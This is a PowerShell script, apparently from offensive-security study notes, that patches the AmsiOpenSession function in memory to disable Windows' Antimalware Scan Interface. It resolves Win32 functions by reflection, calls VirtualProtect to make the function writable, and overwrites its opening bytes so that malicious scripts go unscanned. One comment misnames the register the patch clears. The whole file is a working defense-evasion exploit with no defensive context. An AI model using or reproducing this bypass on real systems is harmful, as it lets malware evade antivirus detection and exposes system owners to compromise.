function LookupFunc{
	## moduleName could be user32.dll, and the functionName would be MessageBoxA from pervious example
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType{
	##first argument: the custom function arguments of the Win32 API given as array
	##Seccond argument: the custom function's return type
	Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
	
	##creates the custom assembly and defines the module and type inside of it.
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), `
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).`
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	
	##Set up constructor method
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).`
	SetImplementationFlags('Runtime, Managed')
	
	##Set up invoke method for the constructor
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).`
	SetImplementationFlags('Runtime, Managed')
	
	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession

##store the old memory protection
$oldProtectionBuffer = 0


## we can change the memory protection with Win32 VirtualProtect382
#BOOL VirtualProtect(
# LPVOID lpAddress, -> base address
# SIZE_T dwSize, -> size,
# DWORD flNewProtect, memory protection type
# PDWORD lpflOldProtect ->a variable where the current memory protection will be stored by the operating system API
#);

## delegate $vp to VirtualProtect function, add invoke method 
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], `
[UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

##change memeory protection to write allow 
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

##overwrite test rcx rcx to xor rcx rxc
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

##reset memory protection back to 0x20
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
